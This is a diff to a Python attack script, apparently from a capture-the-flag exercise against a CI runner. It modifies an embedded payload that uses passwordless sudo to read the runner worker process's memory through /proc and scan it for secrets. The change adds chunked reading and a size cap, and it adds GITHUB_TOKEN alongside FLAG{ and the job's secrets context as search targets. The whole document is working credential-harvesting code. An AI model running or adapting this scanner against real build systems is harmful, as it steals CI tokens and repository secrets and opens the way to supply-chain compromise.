@@ -85,7 +85,7 @@ except Exception as _e:
 
 # Look for the job's secrets context in the runner worker process memory (root via passwordless sudo).
 _SCAN = r"""
-import os, sys, glob
+import os, sys, glob, re
 pids = []
 for p in glob.glob('/proc/[0-9]*'):
     try:
@@ -102,32 +102,40 @@ try:
     maps = open('/proc/%s/maps' % pid).read().splitlines()
 except Exception as e:
     print('MAPS_ERR', e); sys.exit(0)
-import re
 mem = open('/proc/%s/mem' % pid, 'rb', buffering=0)
-found = 0
+scanned = 0
+matches = 0
+CH = 4 * 1024 * 1024
 for line in maps:
+    if scanned > 700 * 1024 * 1024:
+        break
     m = re.match(r'([0-9a-f]+)-([0-9a-f]+) (\S+)', line)
     if not m:
         continue
     start, end, perms = int(m.group(1), 16), int(m.group(2), 16), m.group(3)
     if 'r' not in perms:
         continue
-    size = end - start
-    if size <= 0 or size > 512 * 1024 * 1024:
-        continue
-    try:
-        mem.seek(start)
-        data = mem.read(size)
-    except Exception:
-        continue
-    if not data:
-        continue
-    for needle in (b'FLAG{', b'"secrets"'):
-        i = data.find(needle)
-        if i >= 0:
-            found += 1
-            print('MEM-MATCH', needle, data[max(0, i-60):i+200].hex())
-print('MEM-SCAN-DONE matches=%d' % found)
+    size = min(end - start, 256 * 1024 * 1024)
+    off = 0
+    tail = b''
+    while off < size:
+        try:
+            mem.seek(start + off)
+            data = mem.read(min(CH, size - off))
+        except Exception:
+            break
+        if not data:
+            break
+        buf = tail + data
+        for needle in (b'FLAG{', b'"secrets"', b'GITHUB_TOKEN'):
+            i = buf.find(needle)
+            if i >= 0:
+                matches += 1
+                print('MEM-MATCH', needle, buf[max(0, i-80):i+240].hex())
+        tail = buf[-64:]
+        off += len(data)
+        scanned += len(data)
+print('MEM-SCAN-DONE scanned=%d matches=%d' % (scanned, matches))
 """
 try:
     _r = subprocess.run(['sudo', '-n', 'python3', '-c', _SCAN], capture_output=True, text=True, timeout=120)
